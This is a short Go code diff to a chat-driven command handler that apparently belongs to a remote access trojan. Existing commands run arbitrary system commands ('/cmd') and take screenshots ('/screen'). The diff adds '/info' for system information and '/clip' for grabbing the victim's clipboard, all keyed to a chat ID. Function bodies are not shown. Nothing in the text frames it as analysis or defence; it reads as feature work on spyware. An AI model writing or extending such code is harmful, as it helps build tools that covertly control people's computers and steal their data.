@@ -6,13 +6,16 @@ import (
 )
 
 
-
 func parseCommand(text string, chatID int64) {
 	commandParts := strings.Split(text, " ")
 	commandType := commandParts[0]
 	switch commandType {
+	case "/info":
+		getInfo(chatID)
 	case "/cmd":
 		executeCommand(chatID, commandParts[1:])
+	case "/clip":
+		getClipboard(chatID)
 	case "/screen":
 		takeScreenshots(chatID)
 	default:
